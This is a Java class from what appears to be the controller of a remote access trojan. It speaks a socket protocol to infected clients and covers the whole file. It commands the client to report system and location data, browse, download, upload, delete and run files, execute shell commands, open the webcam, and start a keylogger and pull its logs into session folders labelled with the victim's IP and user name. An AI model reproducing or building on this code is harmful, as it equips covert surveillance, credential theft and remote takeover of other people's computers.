package Connections;


import GUI.ProgressBar.DownloadProgressBar;
import GUI.TableUtils.KeyLogger.KeyloggerEvents;
import Information.*;

import org.json.JSONObject;


import java.io.*;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;


public class Streams {

    private InputStream is;
    private OutputStream os;
    private DataInputStream dis;
    private DataOutputStream dos;
    private SystemInformation tempSystemInformation;
    private NetworkInformation tempNetworkInformation;
    private boolean webcamDialogOpen;

    private final Socket clientSocket;
    private final ExecutorService executor = Executors.newSingleThreadExecutor();

    public Streams(Socket socket) throws IOException {
        if (socket == null) throw new IllegalArgumentException();
        clientSocket = socket;
        is = socket.getInputStream();
        os = socket.getOutputStream();
        dis = new DataInputStream(is);
        dos = new DataOutputStream(os);
    }

    public byte[] receiveBytes() throws IOException {
        int fileSize = readSize();
        int total = 0;
        byte[] buffer = new byte[fileSize];
        // System.out.println("buffer size -> " + buffer.length);
        try {
            while (total < fileSize) {
                int read = dis.read(buffer, total, fileSize - total);
                total += read;
            }
            //System.out.println("REAL TOTAL -> " + total);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

//        System.out.println(total);

        return buffer;
    }


    public void receiveFile(String path) throws IOException {
        String fileName = readString();
        File filePath = new File(path + "\\" + fileName);
        filePath.getParentFile().mkdirs();

        boolean resultOfCreation = filePath.createNewFile();

        System.out.println(resultOfCreation);
        System.out.println("Name " + filePath);

        sendSize(-70);
        int fileSize = readSize();
        int read;
        int total = 0;
        byte[] buffer = new byte[1024];
        FileOutputStream fos;

        fos = new FileOutputStream(filePath);

        BufferedOutputStream bos = new BufferedOutputStream(fos);
        while (total < fileSize) {
            try {
                read = is.read(buffer);
                total += read;
                bos.write(buffer, 0, read);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }

            System.out.println(total);
        }

        bos.flush();
        bos.close();


        System.out.println("File "
                + " downloaded (" + total + " bytes read)");

    }


    private SystemInformation listToSystemInformation(List<String> list) {
        return new SystemInformation(list.get(0), list.get(1), list.get(2), list.get(3), list.get(4), list.get(5), list.get(6));
    }

    private NetworkInformation listToNetworkInformation(String jsonString) {
        JSONObject jsonObject = new JSONObject(jsonString);
        return new NetworkInformation(
                jsonObject.get("query").toString(),
                jsonObject.get("isp").toString(),
                jsonObject.get("continent").toString(),
                jsonObject.get("country").toString(),
                jsonObject.get("regionName").toString(),
                jsonObject.get("city").toString(),
                jsonObject.get("timezone").toString(),
                jsonObject.get("currency").toString(),
                jsonObject.getBoolean("proxy")
        );
    }

    public Object sendAndReadJSON(Action action) throws IOException {
        switch (action) {
            case SYS_INFO -> {
                sendSize(0);
                List<String> informationList = readList();
                return listToSystemInformation(informationList);
            }
            case NET_INFO -> {
                sendSize(1);
                String networkJSON = readString();
                return listToNetworkInformation(networkJSON);
            }
            case DISK -> {
                sendSize(2);
                System.out.println();
                List<String> listOfDisks = readList();
                System.out.println(listOfDisks);
                return listOfDisks.toArray(new String[0]);
            }
            case REQUEST_WEBCAM -> {
                sendSize(16);
                return readList();
            }

        }
        return null;
    }

    public void sendJSON(Action action, List<String> destinations, int length) throws IOException {
        switch (action) {
            case UPLOAD -> {
                sendSize(10);
                sendList(destinations);
                sendSize(length);
            }
        }
    }

    public void sendAndReadJSON(Action action, List<String> fileList, List<String> directoryList) throws IOException {
        switch (action) {
            case COPY -> {
                sendSize(6);
                sendList(fileList);
                sendList(directoryList);
            }
        }
    }

    public void sendAndReadJSON(Action action, List<String> fileList, String directory) throws IOException {
        switch (action) {
            case MOVE -> {
                sendSize(7);
                sendList(fileList);
                sendString(directory);
            }
        }
    }

    public List<String> sendAndReadJSON(Action action, String name) throws IOException {
        switch (action) {
            case R_A_DIR -> {
                sendSize(3);
                sendString(name);
                return new ArrayList<>(Arrays.asList(readString().split("\\|")));
            }
            case R_FO_DIR -> {
                sendSize(4);
                sendString(name);
                return readList();
            }

        }
        return null;
    }

    public String sendAndReadJSONX(Action action, String command) throws IOException {
        switch (action) {
            case SHELL_COMMAND -> {
                sendSize(11);
                sendString(command);
                return readString();
            }
        }
        return null;
    }

    public Object sendAndReadJSON(Action action, String selectedDevice, boolean fragmented, int fps) throws IOException {
        switch (action) {
            case START_WEBCAM -> {
                sendSize(17);
                sendString(selectedDevice);
                sendSize(fragmented ? 1 : 0);
                sendSize(fps);
                return new int[]{readSize(), readSize()};
            }
        }
        return null;
    }


    public void sendAndReadJSON(Action action, List<String> fileList) throws IOException {
        switch (action) {
            case DOWNLOAD -> {
                sendSize(5);
                sendList(fileList);
            }
            case DELETE -> {
                sendSize(8);
                sendList(fileList);
            }
            case RUN -> {
                sendSize(9);
                sendList(fileList);
            }
        }
    }

    public void sendJSON(KeyloggerEvents event) throws IOException {
        String nameOfSession = getSessionFolder() + "/" + "/KeyLogger Logs/"+new Time().getTime();
        switch (event) {
            case START -> sendSize(12);
            case STOP -> sendSize(13);
            case DUMP_LAST -> {
                if (sendAndReadJSONX(KeyloggerEvents.CHECK_LAST)) {
                    sendSize(1401);
                    receiveFile(nameOfSession);
                    FolderOpener.open(nameOfSession);
                }
            }
            case DUMP_ALL -> {
                if (sendAndReadJSONX(KeyloggerEvents.CHECK_ALL)) {
                    sendSize(1402);
                    receiveLogs(nameOfSession);
                    FolderOpener.open(nameOfSession);
                }
            }
        }
    }

    private void receiveLogs(String nameOfSession) throws IOException {
        while (readSize()!=-1){
            receiveFile(nameOfSession);
            sendSize(0);
        }
    }

    public boolean sendAndReadJSONX(KeyloggerEvents event) throws IOException {
        switch (event) {
            case STATE -> {
                sendSize(15);
                return Boolean.parseBoolean(readString());
            }
            case CHECK_LAST -> {
                sendSize(1403);
                return (readSize()!=0);
            }
            case CHECK_ALL -> {
                sendSize(1404);
                return (readSize()!=0);
            }
        }
        return false;
    }

    public void sendList(List<String> fileList) throws IOException {
        for (String file : fileList) {
            sendSize(0);
            sendString(file);
        }
        sendSize(-1);
    }

    public List<String> readList() throws IOException {
        List<String> listOfFiles = new ArrayList<>();
        while (readSize() != -1) {
            listOfFiles.add(readString());
        }
        return listOfFiles;
    }

    public void sendSize(int size) throws IOException {
        dos.writeInt(size);
    }

    public void sendString(String message) throws IOException {
        byte[] buffer = message.getBytes();
        sendSize(buffer.length);
        dos.write(buffer);
    }

    public int readSize() throws IOException {
        return dis.readInt();
    }

    public String readString() throws IOException {
        int size = readSize();
        byte[] buffer = new byte[size];
        int read = is.read(buffer, 0, size);
        return new String(buffer);
    }

    public Socket getClientSocket() {
        return clientSocket;
    }

    public String getSessionFolder() {
        return "Session - " + getIdentifier();
    }

    public String getIdentifier() {
        return tempNetworkInformation.IP() + " - " + tempSystemInformation.USER_NAME();
    }

    public SystemInformation getTempSystemInformation() {
        return tempSystemInformation;
    }

    public void setTempSystemInformation(SystemInformation tempSystemInformation) {
        this.tempSystemInformation = tempSystemInformation;
    }

    public NetworkInformation getTempNetworkInformation() {
        return tempNetworkInformation;
    }

    public void setTempNetworkInformation(NetworkInformation tempNetworkInformation) {
        this.tempNetworkInformation = tempNetworkInformation;
    }

    public boolean isWebcamDialogOpen() {
        return webcamDialogOpen;
    }

    public void setWebcamDialogOpen(boolean webcamDialogOpen) {
        this.webcamDialogOpen = webcamDialogOpen;
    }

    public ExecutorService getExecutor() {
        return executor;
    }

    public DataOutputStream getDos() {
        return dos;
    }

    public DataInputStream getDis() {
        return dis;
    }


}